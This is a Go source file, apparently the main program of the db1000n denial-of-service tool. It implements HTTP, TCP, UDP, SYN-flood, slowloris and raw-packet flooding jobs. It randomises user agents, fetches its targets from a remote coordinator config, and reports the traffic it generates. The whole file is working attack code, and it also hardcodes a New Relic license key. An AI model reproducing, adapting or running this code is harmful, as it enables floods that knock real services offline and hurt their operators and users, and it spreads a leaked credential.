package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"html/template"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"
	"github.com/newrelic/go-agent/v3/newrelic"

	"github.com/Arriven/db1000n/lib"
	"github.com/Arriven/db1000n/logs"
	"github.com/Arriven/db1000n/metrics"
	"github.com/Arriven/db1000n/packetgen"
	"github.com/Arriven/db1000n/slowloris"
	"github.com/Arriven/db1000n/synfloodraw"
)

var Version string
var Time string

// JobArgs comment for linter
type JobArgs = json.RawMessage

type job = func(context.Context, *logs.Logger, JobArgs) error

// JobConfig comment for linter
type JobConfig struct {
	Type  string
	Count int
	Args  JobArgs
}

var jobs = map[string]job{
	"http":       httpJob,
	"tcp":        tcpJob,
	"udp":        udpJob,
	"syn-flood":  synFloodJob,
	"slow-loris": slowLoris,
	"packetgen":  packetgenJob,
}

// Config comment for linter
type Config struct {
	Jobs []JobConfig
}

// BasicJobConfig comment for linter
type BasicJobConfig struct {
	IntervalMs int `json:"interval_ms,omitempty"`
	Count      int `json:"count,omitempty"`

	iter int
}

// Next comment for linter
func (c *BasicJobConfig) Next(ctx context.Context) bool {
	select {
	case <-ctx.Done():
		return false
	default:
	}
	if c.Count > 0 {
		defer func() { c.iter++ }()
		return c.iter < c.Count
	}
	return true
}

func randomUUID() string {
	return uuid.New().String()
}

func parseByteTemplate(input []byte) []byte {
	return []byte(parseStringTemplate(string(input)))
}

func parseStringTemplate(input string) string {
	funcMap := template.FuncMap{
		"random_uuid":     randomUUID,
		"random_int_n":    rand.Intn,
		"random_int":      rand.Int,
		"random_payload":  packetgen.RandomPayload,
		"random_ip":       packetgen.RandomIP,
		"random_port":     packetgen.RandomPort,
		"random_mac_addr": packetgen.RandomMacAddr,
		"base64_encode":   base64.StdEncoding.EncodeToString,
		"base64_decode":   base64.StdEncoding.DecodeString,
		"json_encode":     json.Marshal,
	}
	// TODO: consider adding ability to populate custom data
	tmpl, err := template.New("test").Funcs(funcMap).Parse(input)
	if err != nil {
		logs.Default.Warning("error parsing template: %v", err)
		return input
	}
	var output strings.Builder
	err = tmpl.Execute(&output, nil)
	if err != nil {
		logs.Default.Warning("error executing template: %v", err)
		return input
	}

	return output.String()
}

func httpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	type httpJobConfig struct {
		BasicJobConfig
		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
	}
	var jobConfig httpJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	for jobConfig.Next(ctx) {
		req, err := http.NewRequest(parseStringTemplate(jobConfig.Method), parseStringTemplate(jobConfig.Path), bytes.NewReader(parseByteTemplate(jobConfig.Body)))
		if err != nil {
			l.Debug("error creating request: %v", err)
			continue
		}

		// Add random user agent
		req.Header.Set("user-agent", uarand.GetRandom())
		for key, value := range jobConfig.Headers {
			trafficMonitor.Add(len(key))
			trafficMonitor.Add(len(value))
			req.Header.Add(parseStringTemplate(key), parseStringTemplate(value))
		}
		trafficMonitor.Add(len(jobConfig.Method))
		trafficMonitor.Add(len(jobConfig.Path))
		trafficMonitor.Add(len(jobConfig.Body))

		startedAt := time.Now().Unix()
		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			l.Debug("error sending request %v: %v", req, err)
			continue
		}

		finishedAt := time.Now().Unix()
		resp.Body.Close() // No need for response
		if resp.StatusCode >= 400 {
			l.Debug("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, finishedAt, resp.StatusCode)
		} else {
			l.Debug("%s %s finished at %d", jobConfig.Method, jobConfig.Path, finishedAt)
		}
		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

// RawNetJobConfig comment for linter
type RawNetJobConfig struct {
	BasicJobConfig
	Address string
	Body    json.RawMessage
}

func tcpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	type tcpJobConfig struct {
		RawNetJobConfig
	}
	var jobConfig tcpJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	tcpAddr, err := net.ResolveTCPAddr("tcp", parseStringTemplate(jobConfig.Address))
	if err != nil {
		return err
	}
	for jobConfig.Next(ctx) {
		startedAt := time.Now().Unix()
		l.Debug("%s started at %d", jobConfig.Address, startedAt)

		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			l.Debug("error connecting to [%v]: %v", tcpAddr, err)
			continue
		}

		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
		trafficMonitor.Add(len(jobConfig.Body))

		finishedAt := time.Now().Unix()
		if err != nil {
			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
		} else {
			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
		}
		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

func udpJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	type udpJobConfig struct {
		RawNetJobConfig
	}
	var jobConfig udpJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}
	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	udpAddr, err := net.ResolveUDPAddr("udp", parseStringTemplate(jobConfig.Address))
	if err != nil {
		return err
	}
	startedAt := time.Now().Unix()
	l.Debug("%s started at %d", jobConfig.Address, startedAt)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		l.Debug("error connecting to [%v]: %v", udpAddr, err)
		return err
	}

	for jobConfig.Next(ctx) {
		_, err = conn.Write(parseByteTemplate(jobConfig.Body))
		trafficMonitor.Add(len(jobConfig.Body))

		finishedAt := time.Now().Unix()
		if err != nil {
			l.Debug("%s failed at %d with err: %s", jobConfig.Address, finishedAt, err.Error())
		} else {
			l.Debug("%s started at %d", jobConfig.Address, finishedAt)
		}
		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}
	return nil
}

func synFloodJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	type synFloodJobConfig struct {
		BasicJobConfig
		Host          string
		Port          int
		PayloadLength int    `json:"payload_len"`
		FloodType     string `json:"flood_type"`
	}
	var jobConfig synFloodJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
}

func slowLoris(ctx context.Context, l *logs.Logger, args JobArgs) error {
	var jobConfig *slowloris.Config
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	if len(jobConfig.Path) == 0 {
		l.Error("path is empty")

		return errors.New("path is empty")
	}

	if jobConfig.ContentLength == 0 {
		jobConfig.ContentLength = 1000 * 1000
	}

	if jobConfig.DialWorkersCount == 0 {
		jobConfig.DialWorkersCount = 10
	}

	if jobConfig.RampUpInterval == 0 {
		jobConfig.RampUpInterval = 1 * time.Second
	}

	if jobConfig.SleepInterval == 0 {
		jobConfig.SleepInterval = 10 * time.Second
	}

	if jobConfig.DurationSeconds == 0 {
		jobConfig.DurationSeconds = 10 * time.Second
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending slow loris with params: %v", jobConfig)

	return slowloris.Start(l, jobConfig)
}

func packetgenJob(ctx context.Context, l *logs.Logger, args JobArgs) error {
	type packetgenJobConfig struct {
		BasicJobConfig
		Packet json.RawMessage
		Host   string
		Port   string
	}
	var jobConfig packetgenJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		l.Error("error parsing json: %v", err)
		return err
	}

	host := parseStringTemplate(jobConfig.Host)
	port, err := strconv.Atoi(parseStringTemplate(jobConfig.Port))
	if err != nil {
		l.Error("error parsing port: %v", err)
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())

	for jobConfig.Next(ctx) {
		packetConfigBytes := parseByteTemplate(jobConfig.Packet)
		var packetConfig packetgen.PacketConfig
		err := json.Unmarshal(packetConfigBytes, &packetConfig)
		if err != nil {
			l.Error("error parsing json: %v", err)
			return err
		}
		len, err := packetgen.SendPacket(packetConfig, host, port)
		if err != nil {
			l.Error("error sending packet: %v", err)
			return err
		}
		trafficMonitor.Add(len)
	}
	return nil
}

func fetchConfig(configPath string) (*Config, error) {
	var configBytes []byte
	var err error
	if configURL, err := url.ParseRequestURI(configPath); err == nil {
		resp, err := http.Get(configURL.String())
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode < 200 || resp.StatusCode > 299 {
			return nil, err
		}
		configBytes, err = io.ReadAll(resp.Body)
		if err != nil {
			return nil, err
		}
	} else {
		configBytes, err = os.ReadFile(configPath)
		if err != nil {
			return nil, err
		}
	}
	var config Config
	err = json.Unmarshal(configBytes, &config)
	if err != nil {
		fmt.Printf("error parsing json config: %v\n", err)
		return nil, err
	}
	return &config, nil
}

func dumpMetrics(l *logs.Logger, path, name, clientID string, tracer *newrelic.Application) {
	if path == "" {
		return
	}
	bytesPerSecond := metrics.Default.Read(name)
	l.Info("The app is generating approximately %v bytes per second", bytesPerSecond)
	type metricsDump struct {
		BytesPerSecond int `json:"bytes_per_second"`
	}
	dump := &metricsDump{
		BytesPerSecond: bytesPerSecond,
	}
	dumpBytes, err := json.Marshal(dump)
	if err != nil {
		l.Warning("failed marshaling metrics: %v", err)
		return
	}
	// TODO: use proper ip
	url := fmt.Sprintf("%s?id=%s", path, clientID)
	resp, err := http.Post(url, "application/json", bytes.NewReader(dumpBytes))
	if err != nil {
		l.Warning("failed sending metrics: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
		l.Warning("bad response when sending metrics. code %v", resp.StatusCode)
	}
	if tracer != nil {
		tracer.RecordCustomMetric("bytes_per_second", float64(bytesPerSecond))
	}
}

func main() {
	var configPath string
	var refreshTimeout time.Duration
	var logLevel logs.Level
	var help bool
	var disableNewRelic bool
	var metricsPath string
	flag.StringVar(&configPath, "c", "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json", "path to a config file, can be web endpoint")
	flag.DurationVar(&refreshTimeout, "r", time.Minute, "refresh timeout for updating the config")
	flag.IntVar(&logLevel, "l", logs.Info, "logging level. 0 - Debug, 1 - Info, 2 - Warning, 3 - Error")
	flag.BoolVar(&help, "h", false, "print help message and exit")
	flag.BoolVar(&disableNewRelic, "disableNewRelic", false, "disable report to newrelic")
	flag.StringVar(&metricsPath, "m", "https://us-central1-db1000n-metrics.cloudfunctions.net/addTrafic", "path where to dump usage metrics, can be URL or file, empty to disable")
	flag.Parse()
	if help {
		flag.CommandLine.Usage()
		return
	}
	l := logs.Logger{Level: logLevel}
	l.Info("running version %s", Version)
	// get current hostname
	hostname, err := os.Hostname()
	if err != nil {
		l.Error("error getting hostname: %v", err)
	}
	ip, err := lib.GetOutboundIP()
	if err != nil {
		l.Error("error getting outbound ip: %v", err)
	}
	//add build id metadata https://www.digitalocean.com/community/tutorials/using-ldflags-to-set-version-information-for-go-applications
	var tracer *newrelic.Application
	if !disableNewRelic {
		tracer, err = newrelic.NewApplication(
			newrelic.ConfigAppName(fmt.Sprintf("%s-%s-%s", hostname, ip.String(), Version)),
			newrelic.ConfigLicense("eu01xx6d0804cb62b8c3e43cfadcae69ae9fNRAL"),
		)
		if err != nil {
			panic(err)
		}
	}

	go func() {
		for {
			time.Sleep(10 * time.Second)
			dumpMetrics(&l, metricsPath, "traffic", ip.String(), tracer)
		}
	}()
	var cancel context.CancelFunc
	defer func() {
		cancel()
	}()
	for {
		config, err := fetchConfig(configPath)
		if err != nil {
			l.Warning("fetching json config: %v\n", err)
			continue
		}
		if cancel != nil {
			cancel()
		}
		var ctx context.Context
		ctx, cancel = context.WithCancel(context.Background())
		for _, jobDesc := range config.Jobs {
			if jobDesc.Count < 1 {
				jobDesc.Count = 1
			}
			if job, ok := jobs[jobDesc.Type]; ok {
				for i := 0; i < jobDesc.Count; i++ {
					go job(ctx, &l, jobDesc.Args)
				}
			} else {
				l.Warning("no such job - %s", jobDesc.Type)
			}
		}
		time.Sleep(refreshTimeout)
	}
}
